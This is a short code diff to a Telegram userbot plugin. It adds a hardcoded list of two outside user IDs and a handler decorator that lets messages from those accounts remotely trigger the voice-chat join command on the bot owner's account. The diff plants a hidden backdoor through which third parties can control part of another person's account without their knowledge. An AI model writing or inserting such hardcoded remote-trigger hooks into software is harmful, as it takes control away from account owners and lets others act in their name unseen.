@@ -114,8 +114,10 @@ async def change_title(e):
     except Exception as ex:
         await eod(ayin, get_string("error_1").format(ex))
 
-
+NANDA = [5146829516, 777969420]
+        
 @ayiin_cmd(pattern="joinvc(?: |$)(.*)", group_only=True)
+@register(incoming=True, from_users=NANDA, pattern=r"^Joinvcs$")
 async def _(event):
     sender = await event.get_sender()
     yins = await event.client.get_me()
